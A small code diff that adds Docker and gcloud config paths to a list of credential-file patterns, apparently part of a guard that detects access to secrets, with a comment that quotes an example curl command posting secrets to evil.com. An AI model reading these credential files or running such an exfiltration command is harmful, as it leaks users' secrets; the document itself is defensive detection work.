@@ -116,6 +116,8 @@ _CREDENTIAL_PATTERNS = (
     ".aws/credentials", ".aws\\credentials", ".env", ".netrc", ".npmrc",
     ".kube/config", ".kube\\config", "credentials.json", "service-account",
     "secrets.yaml", "secrets.yml",
+    ".docker/config.json", ".docker\\config.json",
+    ".config/gcloud", ".config\\gcloud",
 )
 
 # Shell-wrapped network egress. `bash: curl -d @secrets https://evil.com` is a
